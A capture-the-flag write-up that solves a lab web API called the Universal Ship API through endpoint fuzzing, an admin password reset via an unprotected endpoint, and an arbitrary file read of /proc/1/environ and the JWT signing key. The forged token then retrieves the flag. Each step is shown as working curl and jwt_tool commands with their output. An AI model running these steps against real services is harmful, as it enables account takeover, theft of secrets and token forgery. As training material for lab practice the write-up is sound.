# U.S.A. (5 points)

Ahoy, officer,

on our last port visit, a new U.S.A. (Universal Ship API) interface was installed on the ship. In order to unlock new
experimental ship functions, the special code has to be entered into ship FLAG (First Layer Application Gateway). Your
task is to get this FLAG code from U.S.A.

May you have fair winds and following seas!

The U.S.A. is available at http://universal-ship-api.cns-jv.tcc.

## Hints

* Status codes 4xx can be helpful.
* The U.S.A. appliance restarts every hour.

## Solution

Let's take a look at he provided website

```console
$ curl -v http://universal-ship-api.cns-jv.tcc/
* processing: http://universal-ship-api.cns-jv.tcc/
*   Trying 10.99.0.108:80...
* Connected to universal-ship-api.cns-jv.tcc (10.99.0.108) port 80
> GET / HTTP/1.1
> Host: universal-ship-api.cns-jv.tcc
> User-Agent: curl/8.2.1
> Accept: */*
>
< HTTP/1.1 200 OK
< date: Thu, 12 Oct 2023 16:56:38 GMT
< server: uvicorn
< content-length: 36
< content-type: application/json
<
* Connection #0 to host universal-ship-api.cns-jv.tcc left intact
{"msg":"Naval ship API version 1.0"}
```

This reveals that the API is running on `uvicorn` server (i.e. Python) but not much else. Let's try to discover some
other content.

```console
$ dirb http://universal-ship-api.cns-jv.tcc

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Thu Oct 12 19:04:47 2023
URL_BASE: http://universal-ship-api.cns-jv.tcc/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://universal-ship-api.cns-jv.tcc/ ----
+ http://universal-ship-api.cns-jv.tcc/api (CODE:200|SIZE:20)
+ http://universal-ship-api.cns-jv.tcc/docs (CODE:401|SIZE:30)

-----------------
END_TIME: Thu Oct 12 19:05:28 2023
DOWNLOADED: 4612 - FOUND: 2
```

It seems there's som documentation (even though `401 Unauthorized` tells us we need to authenticate first) and `/api`.
Let's explore further.

```console
$ curl http://universal-ship-api.cns-jv.tcc/api
{"endpoints":["v1"]}

$ curl http://universal-ship-api.cns-jv.tcc/api/v1
{"endpoints":["user","admin"]}

$ curl -v http://universal-ship-api.cns-jv.tcc/api/v1/user/
* processing: http://universal-ship-api.cns-jv.tcc/api/v1/user/
*   Trying 10.99.0.108:80...
* Connected to universal-ship-api.cns-jv.tcc (10.99.0.108) port 80
> GET /api/v1/user/ HTTP/1.1
> Host: universal-ship-api.cns-jv.tcc
> User-Agent: curl/8.2.1
> Accept: */*
>
< HTTP/1.1 404 Not Found
< date: Thu, 12 Oct 2023 19:02:44 GMT
< server: uvicorn
< content-length: 22
< content-type: application/json
<
* Connection #0 to host universal-ship-api.cns-jv.tcc left intact
{"detail":"Not Found"}

$ curl -v http://universal-ship-api.cns-jv.tcc/api/v1/admin/
* processing: http://universal-ship-api.cns-jv.tcc/api/v1/admin/
*   Trying 10.99.0.108:80...
* Connected to universal-ship-api.cns-jv.tcc (10.99.0.108) port 80
> GET /api/v1/admin/ HTTP/1.1
> Host: universal-ship-api.cns-jv.tcc
> User-Agent: curl/8.2.1
> Accept: */*
>
< HTTP/1.1 401 Unauthorized
< date: Thu, 12 Oct 2023 19:02:53 GMT
< server: uvicorn
< www-authenticate: Bearer
< content-length: 30
< content-type: application/json
<
* Connection #0 to host universal-ship-api.cns-jv.tcc left intact
{"detail":"Not authenticated"}
```

We discovered that there are `/api/v1/user/` and `/api/v1/admin` endpoints.

The request for `/api/v1/user/` returns `401 Unauthorized` and `www-authenticate: Bearer` informs us that we need a
bearer token in order to call it.

The request for `/api/v1/user/` returns `404` which may look strange since the call to `/api/v1/` indicated that it
exists, however, it may still be in line with REST API error code semantics indicating that a particular user has not
been found. Let's check calling `/api/v1/user/<someusername>`.

```console
$ dirb http://universal-ship-api.cns-jv.tcc/api/v1/user/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Thu Oct 12 21:08:52 2023
URL_BASE: http://universal-ship-api.cns-jv.tcc/api/v1/user/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://universal-ship-api.cns-jv.tcc/api/v1/user/ ----
(!) WARNING: All responses for this directory seem to be CODE = 401.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Thu Oct 12 21:08:56 2023
DOWNLOADED: 196 - FOUND: 0
```

As expected, all responses seem to return 401, so the path fragment really seems to be treated as a parameter. However,
it still can shadow some other endpoints using different HTTP methods than `GET`.

Since I don't know how to issue other request than `GET` using `dirb`, let's try a different fuzzer. As the hint
suggests, let's look for some interesting 4xx codes, skipping `404 Not Found` and `405 Method Not Alowed`.

```console
$ ffuf -X POST -mc 400-403,406-499 -u http://universal-ship-api.cns-jv.tcc/api/v1/user/FUZZ -w /usr/share/wordlists/dirb/common.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://universal-ship-api.cns-jv.tcc/api/v1/user/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 400-403,406-499
________________________________________________

login                   [Status: 422, Size: 172, Words: 3, Lines: 1, Duration: 8ms]
signup                  [Status: 422, Size: 81, Words: 2, Lines: 1, Duration: 8ms]
:: Progress: [4614/4614] :: Job [1/1] :: 4000 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

It seems there really are some interesting endpoints accepting `POST` requests. It seems we should first sign up and
then log in.

```console
$ curl -X POST http://universal-ship-api.cns-jv.tcc/api/v1/user/signup
{"detail":[{"loc":["body"],"msg":"field required","type":"value_error.missing"}]}
```

Submitting empty body yields a message explaining how the request should look like. Let's submit some body.

```console
$ curl -H "Content-Type: application/json" -d '{}' http://universal-ship-api.cns-jv.tcc/api/v1/user/signup
{"detail":[{"loc":["body","email"],"msg":"field required","type":"value_error.missing"},{"loc":["body","password"],"msg":"field required","type":"value_error.missing"}]}
```

So we need just `email` and `password` to register.

```console
$ curl -v -H "Content-Type: application/json" -d '{"email":"writeup@cns-jv.tcc", "password": "TheWorstWriteupPasswordEver!"}' http://universal-ship-api.cns-jv.tcc/api/v1/user/signup
* processing: http://universal-ship-api.cns-jv.tcc/api/v1/user/signup
*   Trying 10.99.0.108:80...
* Connected to universal-ship-api.cns-jv.tcc (10.99.0.108) port 80
> POST /api/v1/user/signup HTTP/1.1
> Host: universal-ship-api.cns-jv.tcc
> User-Agent: curl/8.2.1
> Accept: */*
> Content-Type: application/json
> Content-Length: 74
>
< HTTP/1.1 201 Created
< date: Thu, 12 Oct 2023 19:22:32 GMT
< server: uvicorn
< content-length: 2
< content-type: application/json
<
* Connection #0 to host universal-ship-api.cns-jv.tcc left intact
{}
```

The user has been created so let's figure out what fields are required in login request and then log in.

```console
$ curl -H "Content-Type: application/json" -d '{}' http://universal-ship-api.cns-jv.tcc/api/v1/user/login
{"detail":[{"loc":["body","username"],"msg":"field required","type":"value_error.missing"},{"loc":["body","password"],"msg":"field required","type":"value_error.missing"}]}

$ curl -v -H "Content-Type: application/json" -d '{"username":"writeup@cns-jv.tcc", "password": "TheWorstWriteupPasswordEver!"}' http://universal-ship-api.cns-jv.tcc/api/v1/user/login
* processing: http://universal-ship-api.cns-jv.tcc/api/v1/user/login
*   Trying 10.99.0.108:80...
* Connected to universal-ship-api.cns-jv.tcc (10.99.0.108) port 80
> POST /api/v1/user/login HTTP/1.1
> Host: universal-ship-api.cns-jv.tcc
> User-Agent: curl/8.2.1
> Accept: */*
> Content-Type: application/json
> Content-Length: 77
>
< HTTP/1.1 422 Unprocessable Entity
< date: Thu, 12 Oct 2023 19:25:01 GMT
< server: uvicorn
< content-length: 172
< content-type: application/json
<
* Connection #0 to host universal-ship-api.cns-jv.tcc left intact
{"detail":[{"loc":["body","username"],"msg":"field required","type":"value_error.missing"},{"loc":["body","password"],"msg":"field required","type":"value_error.missing"}]}
```

It seems JSON is not processed by `/api/v1/user/login` but perhaps it will accept HTML form data.

```console
$ curl -v -H "Content-Type: application/x-www-form-urlencoded" -d 'username=writeup@cns-jv.tcc&password=TheWorstWriteupPasswordEver!' http://universal-ship-api.cns-jv.tcc/api/v1/user/login
* processing: http://universal-ship-api.cns-jv.tcc/api/v1/user/login
*   Trying 10.99.0.108:80...
* Connected to universal-ship-api.cns-jv.tcc (10.99.0.108) port 80
> POST /api/v1/user/login HTTP/1.1
> Host: universal-ship-api.cns-jv.tcc
> User-Agent: curl/8.2.1
> Accept: */*
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 65
>
< HTTP/1.1 200 OK
< date: Thu, 12 Oct 2023 19:27:10 GMT
< server: uvicorn
< content-length: 932
< content-type: application/json
<
* Connection #0 to host universal-ship-api.cns-jv.tcc left intact
{"access_token":"eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk3ODMwMDMxLCJpYXQiOjE2OTcxMzg4MzEsInN1YiI6IjIiLCJhZG1pbiI6ZmFsc2UsImd1aWQiOiI2ZjgyY2QyMi01ZGFhLTQ2MzAtOWFhYS03OGIzMGI5YWJhZWMifQ.VPl2XEUtGrWJ8b67CLg8rUkEUuef8gqWX-JxWzivtPzNuFKOT8ucKGjUvzpLXR3atp90qePmbUzKcETMHV2_NhpjxGuvO0RboxkL0BpYnorFJOJwXUkuQQpyFl_XBQw1dp-eGHED8ernCO3TKkDFpLBbvwlALJzg9xGWeMYx7yb_CuDeppEhCuiX35ZvwNkyTtJ-9XTOqIzWHQAXE9arcELcgHBt3aPaPzJtRTWRhCd3bzfOqAiciZo8xfyMQN_kk-21Qh3W0BStHg6Ca_zUHkgPMw9ZO7R30YZxCWHDBqhLJbbEb7gcNI3U4t7-veZ3VfR1kzYs7ie5wrAe8noEtcxiv06cvGJx2PcSnqScSasziu8R1qfI3YWZfdjFW3NknTs5T0iNAyaSp4SoeavGFD0HdIDypL4_oE1uOZ5aaUfxZyygOJI8Aofs3G6naIUIFfqs716ez44dpcxy26_FQxw-jkiv9-3DfKx9cWK5IDKcDVzfs3cSEZ42BjiUXCq2g0Mb6_okBfcCf9c4FcNl5sRE9a0OJslGLtKWhp9zPFnRs4UPxQM3-icWnVFJ61PQPt0crRyp8MdPdIk7oS_IW_oiODz_FzpMVyCzC7l64lXspLsUrfbqgiK0_6hQC4vP2Ij_td_Nls2mwiU2TTB0M3Ms_E8VZSA0Dn_uUlvHIJg","token_type":"bearer"}
```

And we're in. Since we have a token (let's assume it is stored in `usertoken` env variable from now on), we can try to
access documentation at `/docs`

_Note: It is possible to use an extension in a browser, e.g. [ModHeader] in Chrome, to add the
`Authorization: Bearer <token>` header to outgoing requests to be able to access the docs from a browser._

![Documentation unlocked](docs.png)

The `/api/v1/admin/` check unsurprisingly returns false, but we can try enumerating some users (starting with 1).

```console
$ curl -H "Authorization: Bearer $usertoken" http://universal-ship-api.cns-jv.tcc/api/v1/user/1
{"guid":"c715a9e9-4e0f-45ab-bd70-13a8fccfd379","email":"admin@local.tcc","date":null,"time_created":1690796892351,"admin":true,"id":1}
```

We're lucky. The first user is admin so we need to impersonate it. We don't know the credentials, however,
the `/api/v1/user/updatepassword` seems to be accessible for all users, and it just needs `guid` (which we just
retrieved) and a new password.

```console
$ curl -v -H "Authorization: Bearer $usertoken" -H "Content-Type: application/json" -d '{"guid":"c715a9e9-4e0f-45ab-bd70-13a8fccfd379", "password": "TheWorstWriteupPasswordEver!"}' http://universal-ship-api.cns-jv.tcc/api/v1/user/updatepassword
* processing: http://universal-ship-api.cns-jv.tcc/api/v1/user/updatepassword
*   Trying 10.99.0.108:80...
* Connected to universal-ship-api.cns-jv.tcc (10.99.0.108) port 80
> POST /api/v1/user/updatepassword HTTP/1.1
> Host: universal-ship-api.cns-jv.tcc
> User-Agent: curl/8.2.1
> Accept: */*
> Authorization: Bearer eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk3ODMwMDMxLCJpYXQiOjE2OTcxMzg4MzEsInN1YiI6IjIiLCJhZG1pbiI6ZmFsc2UsImd1aWQiOiI2ZjgyY2QyMi01ZGFhLTQ2MzAtOWFhYS03OGIzMGI5YWJhZWMifQ.VPl2XEUtGrWJ8b67CLg8rUkEUuef8gqWX-JxWzivtPzNuFKOT8ucKGjUvzpLXR3atp90qePmbUzKcETMHV2_NhpjxGuvO0RboxkL0BpYnorFJOJwXUkuQQpyFl_XBQw1dp-eGHED8ernCO3TKkDFpLBbvwlALJzg9xGWeMYx7yb_CuDeppEhCuiX35ZvwNkyTtJ-9XTOqIzWHQAXE9arcELcgHBt3aPaPzJtRTWRhCd3bzfOqAiciZo8xfyMQN_kk-21Qh3W0BStHg6Ca_zUHkgPMw9ZO7R30YZxCWHDBqhLJbbEb7gcNI3U4t7-veZ3VfR1kzYs7ie5wrAe8noEtcxiv06cvGJx2PcSnqScSasziu8R1qfI3YWZfdjFW3NknTs5T0iNAyaSp4SoeavGFD0HdIDypL4_oE1uOZ5aaUfxZyygOJI8Aofs3G6naIUIFfqs716ez44dpcxy26_FQxw-jkiv9-3DfKx9cWK5IDKcDVzfs3cSEZ42BjiUXCq2g0Mb6_okBfcCf9c4FcNl5sRE9a0OJslGLtKWhp9zPFnRs4UPxQM3-icWnVFJ61PQPt0crRyp8MdPdIk7oS_IW_oiODz_FzpMVyCzC7l64lXspLsUrfbqgiK0_6hQC4vP2Ij_td_Nls2mwiU2TTB0M3Ms_E8VZSA0Dn_uUlvHIJg
> Content-Type: application/json
> Content-Length: 91
>
< HTTP/1.1 201 Created
< date: Thu, 12 Oct 2023 19:44:37 GMT
< server: uvicorn
< content-length: 134
< content-type: application/json
<
* Connection #0 to host universal-ship-api.cns-jv.tcc left intact
{"guid":"c715a9e9-4e0f-45ab-bd70-13a8fccfd379","email":"admin@local.tcc","date":null,"time_created":1690796892351,"admin":true,"id":1}
```

After successful password change, let's log in (before someone else changes it again)

```console
$ curl -v -H "Content-Type: application/x-www-form-urlencoded" -d 'username=admin@local.tcc&password=TheWorstWriteupPasswordEver!' http://universal-ship-api.cns-jv.tcc/api/v1/user/login
* processing: http://universal-ship-api.cns-jv.tcc/api/v1/user/login
*   Trying 10.99.0.108:80...
* Connected to universal-ship-api.cns-jv.tcc (10.99.0.108) port 80
> POST /api/v1/user/login HTTP/1.1
> Host: universal-ship-api.cns-jv.tcc
> User-Agent: curl/8.2.1
> Accept: */*
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 62
>
< HTTP/1.1 200 OK
< date: Thu, 12 Oct 2023 19:45:09 GMT
< server: uvicorn
< content-length: 930
< content-type: application/json
<
* Connection #0 to host universal-ship-api.cns-jv.tcc left intact
{"access_token":"eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk3ODMxMTExLCJpYXQiOjE2OTcxMzk5MTEsInN1YiI6IjEiLCJhZG1pbiI6dHJ1ZSwiZ3VpZCI6ImM3MTVhOWU5LTRlMGYtNDVhYi1iZDcwLTEzYThmY2NmZDM3OSJ9.CP1af64xNQ1O2Foyo-Q6ys3S7S7fvOoGyTOGIfOUjKOrbdNS4KsJkpsq9QX-pPpSnIEZu2r_-xgduuvEcfFtYJkBCyKDG7o1c9UoxxQpvuNAbDXxMstW96tT-I0M1KLkcQFpqGUVDYxhmkTzZUBIk8z939Ivr4ouZFBsCkIL8OrZ0SxeFm1uCioVdTldSz4XssgZFSyZA_VpWOXwvZN4SWhvfEIQW7Dj61_W4OGuDDGD8KevegBsqnZKXYHeEnX2Qm4x4fsAVoINvh-GmSKUEKMloJTe2RpZp1-9zdAVQmBNIE0AZ1FpC74MY0FoEtHsqIxwfcqr6sFJrbTT2exuxFiqcqTM36ntE5_gWlrU2WuoBGJUtHKxaKKoHnJgcwJhL08I1MYklDqdjo4dSNOyUms00SnmHgtTT6sRTNY2vjwIDo7Yd3M5FSdWSNIOlz682kAg3RNygjGNudXO-y_J4Lyqh8ZCBVJKvzo9-4CT4x_5QyA3CsUTMVE30uRFy3CTqCRccKss8DaSrWj5BGjrN66FrUIYUvyBokxj_pa_pPUNYxzSc34660YGgU_MElrZBBvo353RfCvQwZcXGtDXwI23_EGZYI0O35kOrewiG-kionpP3Z4VDcFCcogXrHIxs7Gl-EvjM0MWrvlXUOtMrt5-VU1wU1SNxDTZUJgukDc","token_type":"bearer"}
```

We now have another token (let's store it in `admintoken` env variable), which should be admin.

```console
$ curl -H "Authorization: Bearer $admintoken" http://universal-ship-api.cns-jv.tcc/api/v1/admin/
{"results":true}
```

Let's try and retrieve the flag with the admin token.

```console
$ curl -X PUT -H "Authorization: Bearer $admintoken" http://universal-ship-api.cns-jv.tcc/api/v1/admin/getFlag
{"detail":"flag-read key missing from JWT"}
```

That's not good. The token, even though it's admin one, seems to be missing some keys. We'll need to inspect and
manipulate it so let's obtain [jwt_tool].

Let's take a look inside

```text
./jwt_tool $admintoken
```

![jwt_tool showing decoded admin token](admin-token.png)

Unfortunately the `RS384` algorithm seems to be quite strong (and asymmetric) for breaking, so we'll need to find some
other way. However, we haven't used `/api/v1/api/file` method so let's take a look if we can find some keys on the
server. First, let's check what's running there.

_Note: The schema indicates that the response contains JSON with file content in a `file` field so we'll use `jq` to
extract it from the response._

```console
$ curl -s -H "Authorization: Bearer $admintoken" -H "Content-Type: application/json" -d '{"file":"/proc/1/cmdline"}' http://universal-ship-api.cns-jv.tcc/api/v1/admin/file | jq .file
"/app/venv/bin/python\u0000/app/venv/bin/uvicorn\u0000--reload\u0000--host\u00000.0.0.0\u0000--workers\u000010\u0000--port\u000080\u0000shipapi.main:app\u0000"

$ curl -s -H "Authorization: Bearer $admintoken" -H "Content-Type: application/json" -d '{"file":"/proc/1/environ"}' http://universal-ship-api.cns-jv.tcc/api/v1/admin/file | jq .file
"HOSTNAME=3d8fcef4af21\u0000PYTHON_VERSION=3.10.13\u0000APP_MODULE=shipapi.main:app\u0000PWD=/app\u0000PORT=80\u0000PYTHON_SETUPTOOLS_VERSION=65.5.1\u0000TZ=Europe/Prague\u0000HOME=/home/appuser\u0000LANG=C.UTF-8\u0000VIRTUAL_ENV=/app/venv\u0000GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D\u0000PYTHONPATH=.\u0000HOST=0.0.0.0\u0000SHLVL=0\u0000PYTHON_PIP_VERSION=23.0.1\u0000VIRTUAL_ENV_PROMPT=(venv) \u0000PYTHON_GET_PIP_SHA256=45a2bb8bf2bb5eff16fdd00faef6f29731831c7c59bd9fc2bf1f3bed511ff1fe\u0000PS1=(venv) \u0000PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/9af82b715db434abb94a0a6f3569f43e72157346/public/get-pip.py\u0000PATH=/app/venv/bin:/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000"
```

We can see that `uvicorn` is running in `/app` directory (see `PWD` in request asking for `proc/1/environ`) and it's
launching `shipapi.main:app` application. Uvicorn documentation reveals that without extra args the application is
loaded from the current directory so we can request `/app/shipapi/main.py`.

```console
$ curl -s -H "Authorization: Bearer $admintoken" -H "Content-Type: application/json" -d '{"file":"/app/shipapi/main.py"}' http://universal-ship-api.cns-jv.tcc/api/v1/admin/file | jq -r .file
```

```python
import asyncio

from fastapi import FastAPI, APIRouter, Query, HTTPException, Request, Depends
from fastapi_contrib.common.responses import UJSONResponse
from fastapi import FastAPI, Depends, HTTPException, status
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from fastapi.openapi.docs import get_swagger_ui_html
from fastapi.openapi.utils import get_openapi

from typing import Optional, Any
from pathlib import Path
from sqlalchemy.orm import Session

from shipapi.schemas.user import User
from shipapi.api.v1.api import api_router
from shipapi.appconfig.config import settings

from shipapi import deps
from shipapi import crud

app = FastAPI(title="Naval ship API", openapi_url=None, docs_url=None, redoc_url=None)
root_router = APIRouter(default_response_class=UJSONResponse)


@app.get("/", summary=" ", status_code=200, include_in_schema=False)
def root():
    """
    Root
    """
    return {"msg": "Naval ship API version 1.0"}


@app.get("/api", summary="List versions", status_code=200, include_in_schema=False)
def list_versions():
    """
    API versions
    """
    return {"endpoints": ["v1"]}


@app.get("/api/v1", summary="List v1 endpoints", status_code=200, include_in_schema=False)
def list_endpoints_v1():
    """
    API v1 Endpoints
    """
    return {"endpoints": ["user", "admin"]}


@app.get("/docs", summary="Documentation", include_in_schema=False)
async def get_documentation(
        current_user: User = Depends(deps.parse_token)
):
    return get_swagger_ui_html(openapi_url="/openapi.json", title="Naval ship API docs")


@app.get("/openapi.json", include_in_schema=False)
async def openapi(
        current_user: User = Depends(deps.parse_token)
):
    return get_openapi(title="Naval Ship API", version="1.0", routes=app.routes)


app.include_router(api_router, prefix=settings.API_V1_STR)
app.include_router(root_router)


def start():
    import uvicorn

    uvicorn.run(app, host="0.0.0.0", port=80, log_level="debug")


if __name__ == "__main__":
    import uvicorn

    uvicorn.run(app, host="0.0.0.0", port=80, log_level="debug")
```

The `from shipapi.appconfig.config import settings` part looks like it might contain some useful info, so let's check
`/app/shipapi/appconfig/config.py`.

```console
$ curl -s -H "Authorization: Bearer $admintoken" -H "Content-Type: application/json" -d '{"file":"/app/shipapi/appconfig/config.py"}' http://universal-ship-api.cns-jv.tcc/api/v1/admin/
file | jq -r .file
```

```python
from pydantic import AnyHttpUrl, BaseSettings, EmailStr, validator
from typing import List, Optional, Union

from enum import Enum


class Settings(BaseSettings):
    API_V1_STR: str = "/api/v1"

    JWT_RSA_KEY = open('shipapi/appconfig/jwtsigning.key').read()
    JWT_RSA_PUB = open('shipapi/appconfig/jwtsigning.pub').read()
    ALGORITHM: str = "RS384"
    #   We don't use symmetric cipher algo anymore
    JWT_SECRET: str = "TW!BMP9yVRiDEziTsekVoHZJFcXQgZf8"

    ACCESS_TOKEN_EXPIRE_MINUTES: int = 60 * 24 * 8
    CORS_ORIGINS: List[AnyHttpUrl] = []

    @validator("CORS_ORIGINS", pre=True)
    def assemble_cors_origins(cls, v: Union[str, List[str]]) -> Union[List[str], str]:
        if isinstance(v, str) and not v.startswith("["):
            return [i.strip() for i in v.split(",")]
        elif isinstance(v, (list, str)):
            return v
        raise ValueError(v)

    SQLALCHEMY_DATABASE_URI: Optional[str] = "sqlite:///navalship.db"

    class Config:
        case_sensitive = True


settings = Settings()
```

Since we need to modify the token, we need the signing key, so let's save it.

```console
$ curl -s -H "Authorization: Bearer $admintoken" -H "Content-Type: application/json" -d '{"file":"/app/shipapi/appconfig/jwtsigning.key"}' http://universal-ship-api.cns-jv.tcc/api/v1/admin/file | jq -r .file > jwtsigning.key
```

Before tampering the token let's just check the code for the admin endpoint to make sure how the flag is protected.

```console
$ curl -s -H "Authorization: Bearer $admintoken" -H "Content-Type: application/json" -d '{"file":"/app/shipapi/api/v1/endpoints/admin.py"}' http://universal-ship-api.cns-jv.tcc/api/v1/admin/file | jq -r .file
```

```python
import asyncio

from fastapi import APIRouter, Depends, HTTPException, Query, Request
from sqlalchemy.orm import Session
from typing import Any, Optional

from shipapi import crud
from shipapi import deps

from shipapi import schemas

from shipapi.schemas.admin import GetFile
from shipapi.schemas.user import User
import requests

router = APIRouter()


@router.get("/", status_code=200)
def admin_check(
        *,
        current_user: User = Depends(deps.parse_token),
        db: Session = Depends(deps.get_db)
) -> dict:
    """
    Returns true if the user is in admin role
    """
    if current_user['admin']:
        return {"results": True}

    return {"results": False}


@router.post("/file", status_code=200)
def get_file(
        file_in: GetFile,
        current_user: User = Depends(deps.parse_token),
        db: Session = Depends(deps.get_db)
) -> str:
    """
    Returns a file on the server
    """
    if not current_user['admin']:
        return {"msg": "Permission Error"}
    try:
        with open(file_in.file) as f:
            output = f.read()
            return {"file": output}
    except:
        raise HTTPException(status_code=404, detail="File not found")


@router.put("/getFlag", status_code=200)
def get_flag(current_user: User = Depends(deps.parse_token)) -> Any:
    """
    The Flag
    """
    if not current_user['admin']:
        return {"msg": "Permission Error"}

    if "flag-read" not in current_user.keys():
        raise HTTPException(status_code=400, detail="flag-read key missing from JWT")

    flag = requests.get('http://flagship:8000').text
    return {"Flag": flag}
```

We see that it really just checks the presence of the `flag-read` key in the token and nothing else. With the signing
key already retrieved, we should now be able to modify the token, add the required `flag-read` key to the payload (e.g.
with value of `true`, but it does not really matter) and re-sign it.

```console
$ ./jwt_tool.py $admintoken -I -pc flag-read -pv true -S rs384 -pr jwtsigning.key
```

![jwt_tool showing tampered admin token](admin-token-tampered.png)

```console
$ curl -X PUT -H "Authorization: Bearer $tamperedadmintoken" http://universal-ship-api.cns-jv.tcc/api/v1/admin/getFlag
{"Flag":"FLAG{910P-iUeJ-Wwq1-i8L2}"}
```

[jwt_tool]: https://github.com/ticarpi/jwt_tool

[ModHeader]: https://chrome.google.com/webstore/detail/modheader-modify-http-hea/idgpnmonknjnojddfkpgkljpfnnfcklj
